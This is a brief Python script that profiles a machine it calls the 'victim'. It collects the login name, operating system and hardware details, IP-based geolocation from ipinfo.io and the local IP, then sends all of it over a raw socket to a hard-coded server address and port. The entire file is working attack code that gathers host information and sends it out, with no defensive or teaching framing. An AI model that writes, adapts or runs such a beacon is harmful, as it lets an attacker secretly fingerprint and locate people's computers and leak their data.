import platform
import os
import socket
from datetime import datetime
from requests import *

serveur_hôte, serveur_port = "192.168.1.192", 12345

def user_info():
    json = get('http://ipinfo.io/json').json()
    message = '\n'.join(['New session start : ', '-> ' + datetime.today().strftime('%Y-%m-d %H:%M'), '--------------------------',
                         'victim name : ' + os.getlogin(), 'Os system : ' + platform.uname().system,
                         'Node name : ' + platform.uname().node, 'Os release : ' + platform.uname().release,
                         'Os version : ' + platform.uname().version, 'Machine type : ' + platform.uname().machine,
                         'Processor : ' + platform.uname().processor, '---------------------------',
                         'Ip adress: ' + json['ip'], 'Departure : ' + json["region"], 'City : ' + json["city"],
                         'Postal : ' + json['postal'], 'Country : ' + json['country'], 'Location : ' + json['loc'],
                         'Org : ' + json['org'], 'Time zone : ' + json['timezone'], '---------------------------'])
    return message

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((serveur_hôte, serveur_port))
client.send(platform.node().encode())
client.send(user_info().encode())
client.send(socket.gethostbyname(socket.gethostname()).encode())

client.close()
